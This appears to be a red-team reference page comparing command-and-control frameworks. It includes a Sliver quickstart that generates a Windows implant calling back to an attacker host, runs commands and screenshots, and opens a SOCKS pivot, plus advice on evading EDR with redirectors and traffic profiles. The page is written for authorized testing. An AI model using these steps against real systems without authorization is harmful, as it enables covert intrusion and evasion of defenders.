# :material-satellite-uplink: C2 Frameworks

<span class="pill pill-info">tooling</span> <span class="pill pill-hard">post-ex</span>

Command-and-control frameworks manage implants, tasking, and pivoting during the
post-exploitation phase. Pick one that matches your ROE and detection budget.

!!! abstract "TL;DR"
    Cobalt Strike is the industry standard (paid); **Sliver** and **Havoc** are the
    strong free alternatives; **Mythic** is the modular multi-agent platform. Always
    profile your traffic (malleable C2 / redirectors) to survive EDR.

## :material-format-list-bulleted: The landscape

| Framework | Notes |
| --- | --- |
| **Cobalt Strike** | Commercial standard; Beacon, malleable C2 profiles, BOFs. Heavily signatured. |
| **Sliver** (BishopFox) | Free, Go, cross-platform; mTLS/HTTP(S)/DNS/WireGuard; great default choice. |
| **Havoc** | Free, modern; Demon agent; sleep obfuscation, indirect syscalls. |
| **Mythic** | Free, Docker-based; multi-agent (Apollo, Poseidon, etc.); scriptable. |
| **Metasploit** | Ubiquitous but very signatured — fine for labs/CTF, loud on real nets. |
| **Empire / Starkiller** | PowerShell/Python; older but still handy. |

## :material-console: Sliver quickstart

```bash
# server
sliver-server
> https                                   # start an HTTPS listener
> generate --http $ATTACKER --os windows --save ./implant.exe
# after execution, interact
> sessions
> use <id>
> ps ; execute -o whoami ; screenshot
> socks5 start                            # pivot: SOCKS proxy through the implant
```

!!! opsec "C2 traffic is what EDR hunts"
    Use a **redirector** (nginx/CDN) in front of the team server, a **malleable /
    custom profile** to shape traffic, and long **sleep + jitter**. Don't reuse
    default profiles or self-signed certs — they're fingerprinted. Get the traffic
    profile approved in your ROE.

## :material-transit-connection-variant: Pivoting

Every framework can tunnel — SOCKS proxy, port forwards, and named-pipe/SMB peer
links for internal hosts that can't reach your server directly. See
[Pivoting & Exfil](../privesc/pivoting.md).
